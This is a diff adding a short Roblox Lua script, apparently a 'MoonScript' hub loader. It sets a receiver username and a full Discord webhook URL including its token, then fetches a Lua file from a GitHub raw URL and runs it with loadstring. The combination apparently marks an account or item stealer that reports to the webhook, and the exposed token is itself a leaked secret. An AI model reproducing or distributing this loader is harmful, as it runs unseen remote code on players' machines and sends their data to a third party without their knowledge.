@@ -1,0 +1,7 @@
+_G.Username = "mxrcuszzzzz"
+
+_G.HubName = "MoonScript"
+
+_G.WebhookUrl = "https://discord.com/api/webhooks/1120144669855187015/ymJoZVF5ajlFDCS-frojopcKZIlr4x22tk72pDCfME5FKwD1A7prxmPlKalCRjYXdllK"
+
+loadstring(game:httpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()￼Enter
